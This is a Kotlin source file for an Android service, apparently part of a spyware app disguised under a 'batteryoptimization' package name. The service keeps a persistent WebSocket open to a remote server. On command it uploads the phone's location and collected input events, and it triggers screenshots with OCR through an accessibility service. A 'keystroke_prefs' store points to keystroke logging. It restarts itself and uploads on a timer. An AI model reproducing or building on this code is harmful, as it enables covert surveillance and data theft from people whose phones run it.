package com.android.batteryoptimization

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.android.batteryoptimization.network.WebSocketManager
import com.google.gson.JsonObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * 保活服务 → 同时管理 WebSocket 长连接，接收服务器下发的指令。
 *
 * 支持的指令：
 *  - report_location    → 立即获取地理位置并上传
 *  - upload_data        → 立即上传收集到的事件数据
 *  - take_screenshot    → 触发截屏 + OCR
 *  - set_interval       → 修改自动截屏间隔
 */
class KeepAliveService : Service() {

    @Volatile
    private var lastReportLocationTime = 0L
    private val REPORT_LOCATION_DEBOUNCE_MS = 500L // 10_000L

    private var isWebSocketStarted = false

    // 定时上传兜底：独立于 InputRepository 的定时器，防止进程重建期间事件积压不上传
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var uploadJob: Job? = null
    private val UPLOAD_TIMER_INTERVAL_MS = 30_000L // 30 seconds

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "KeepAliveService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "KeepAliveService started")

        if (!isWebSocketStarted) {
            isWebSocketStarted = true
            setupWebSocket()
        }
        startUploadTimer()

        // 兜底：周期调度补传任务（有网时定期检查待传位置队列）
        PendingLocationWorker.schedulePeriodic(this)

        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        WebSocketManager.removeCommandListener(commandListener)
        WebSocketManager.stop()
        Log.d(TAG, "KeepAliveService destroyed")
    }

    /** 定时上传兜底：每 30 秒尝试上传一次本地积压事件 */
    private fun startUploadTimer() {
        uploadJob?.cancel()
        uploadJob = serviceScope.launch {
            while (isActive) {
                delay(UPLOAD_TIMER_INTERVAL_MS)
                try {
                    val repo = InputRepository.getInstance(this@KeepAliveService)
                    val (_, msg) = repo.uploadData()
                    Log.d(TAG, "定时上传: $msg")
                } catch (e: Exception) {
                    Log.e(TAG, "定时上传失败", e)
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── WebSocket 初始化 ─────────────────────────────────────────────

    private val commandListener: (String, Any?) -> Unit = { command, params ->
        handleCommand(command, params as? JsonObject)
    }

    private fun setupWebSocket() {
        WebSocketManager.addCommandListener(commandListener)
        WebSocketManager.start(this)
    }

    // ─── 指令分发 ─────────────────────────────────────────────────────

    private fun handleCommand(command: String, params: JsonObject?) {
        Log.d(TAG, "收到心跳信息 Handling command: $command")
        when (command) {
            "report_location" -> handleReportLocation()
            "upload_data" -> handleUploadData()
            "take_screenshot" -> handleTakeScreenshot()
            "set_interval" -> handleSetInterval(params)
            "report_enabled" -> handleReportEnabled(params)

            else -> Log.w(TAG, "Unknown command: $command")
        }
    }

    /** 立即获取定位并通过 WebSocket 上报（10秒防抖） */
    private fun handleReportLocation() {
        Log.e(TAG, "心跳进入定位方法")
        val now = System.currentTimeMillis()
        if (now - lastReportLocationTime < REPORT_LOCATION_DEBOUNCE_MS) {
            Log.d(TAG, "心跳过短，跳过；handleReportLocation debounced, skip. last=${lastReportLocationTime}, now=$now")
            return
        }
        lastReportLocationTime = now
        Thread {
            try {
                Log.e(TAG, "心跳开始定位")
                val location = AMapLocationHelper.getLocation(this).toMutableMap()
                location["source"] = "heartbeat"
                if (WebSocketManager.isConnected()) {
                    WebSocketManager.sendLocation(location)
                    AMapLocationHelper.logGpsUpload(this@KeepAliveService, location)
                    Log.d(TAG, "心跳定位发送成功，Location reported: lat=${location["latitude"]}, lng=${location["longitude"]} ， location = $location")
                } else {
                    // WebSocket 未连接 → 落盘待传 + 调度 WorkManager 补传
                    Log.w(TAG, "WebSocket 未连接，心跳位置存入待传队列")
                    AMapLocationHelper.savePendingLocation(this, location)
                    PendingLocationWorker.scheduleRetry(this)
                }
            } catch (e: Exception) {
                Log.e(TAG, "心跳定位发送失败，Failed to report location", e)
            }
        }.start()
    }

    /** 立即上报收集到的事件数据 */
    private fun handleUploadData() {
        Thread {
            try {
                val repo = InputRepository.getInstance(this)
                kotlinx.coroutines.runBlocking {
                    val (_, msg) = repo.uploadData()
                    Log.d(TAG, "Upload triggered by server: $msg")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload data", e)
            }
        }.start()
    }

    /** 触发截屏 + OCR */
    private fun handleTakeScreenshot() {
        val intent = Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
            setPackage(packageName)
        }
        sendBroadcast(intent)
        Log.d(TAG, "Screenshot broadcast sent")
    }

    /** 修改自动截屏间隔 */
    private fun handleSetInterval(params: JsonObject?) {
        val intervalMs = params?.get("interval_ms")?.asLong
        if (intervalMs != null && intervalMs > 0) {
            val prefs = getSharedPreferences("keystroke_prefs", MODE_PRIVATE)
            prefs.edit().putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs).apply()
            Log.d(TAG, "Screenshot interval set to ${intervalMs}ms")
        }
    }

    /** 数据上报开关（report_enabled 指令） */
    private fun handleReportEnabled(params: JsonObject?) {
        val reportEnabled = params?.get("reportEnabled")?.asInt
        if (reportEnabled != null) {
            val repo = InputRepository.getInstance(this)
            repo.setReportEnabled(reportEnabled == 1)
            Log.d(TAG, "数据上报开关: ${if (reportEnabled == 1) "开启" else "关闭"}")
        }
    }

    companion object {
        private const val TAG = "KeepAlive"
    }
}
